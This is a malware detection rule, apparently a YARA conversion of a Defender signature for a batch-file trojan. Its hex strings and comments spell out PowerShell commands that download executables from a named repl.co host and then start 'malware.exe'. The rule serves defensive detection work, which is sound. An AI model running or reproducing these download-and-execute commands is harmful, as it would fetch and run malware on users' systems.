
rule Trojan_BAT_BatRunner_CXFW_MTB{
	meta:
		description = "Trojan:BAT/BatRunner.CXFW!MTB,SIGNATURE_TYPE_PEHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 20 77 67 65 74 20 68 74 74 70 73 3a 2f 2f 46 69 6c 65 55 70 6c 6f 61 64 73 2d 2d 61 73 70 68 61 6c 74 2e 72 65 70 6c 2e 63 6f 2f 75 70 6c 6f 61 64 73 2f 63 77 6f 64 2f 6d 61 6c 77 61 72 65 2e 65 78 65 20 2d 6f 75 74 66 69 6c 65 20 22 6d 61 6c 77 61 72 65 2e 65 78 65 22 } //1 powershell wget https://FileUploads--asphalt.repl.co/uploads/cwod/malware.exe -outfile "malware.exe"
		$a_01_1 = {70 6f 77 65 72 73 68 65 6c 6c 20 77 67 65 74 20 68 74 74 70 73 3a 2f 2f 46 69 6c 65 55 70 6c 6f 61 64 73 2d 2d 61 73 70 68 61 6c 74 2e 72 65 70 6c 2e 63 6f 2f 75 70 6c 6f 61 64 73 2f 63 77 6f 64 2f 63 6f 72 6f 6e 61 79 65 61 68 6f 6f 66 75 72 70 63 77 69 6c 6c 64 69 65 2e 65 78 65 20 2d 6f 75 74 66 69 6c 65 20 22 63 6f 72 6f 6e 61 79 65 61 68 6f 6f 66 75 72 70 63 77 69 6c 6c 64 69 65 2e 65 78 65 22 } //1 powershell wget https://FileUploads--asphalt.repl.co/uploads/cwod/coronayeahoofurpcwilldie.exe -outfile "coronayeahoofurpcwilldie.exe"
		$a_01_2 = {70 6f 77 65 72 73 68 65 6c 6c 20 77 67 65 74 20 68 74 74 70 73 3a 2f 2f 46 69 6c 65 55 70 6c 6f 61 64 73 2d 2d 61 73 70 68 61 6c 74 2e 72 65 70 6c 2e 63 6f 2f 75 70 6c 6f 61 64 73 2f 63 77 6f 64 2f 37 33 36 43 36 46 37 37 36 34 36 46 37 37 36 45 2e 65 78 65 20 2d 6f 75 74 66 69 6c 65 20 22 37 33 36 43 36 46 37 37 36 34 36 46 37 37 36 45 2e 65 78 65 22 } //1 powershell wget https://FileUploads--asphalt.repl.co/uploads/cwod/736C6F77646F776E.exe -outfile "736C6F77646F776E.exe"
		$a_01_3 = {73 74 61 72 74 20 6d 61 6c 77 61 72 65 2e 65 78 65 } //1 start malware.exe
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}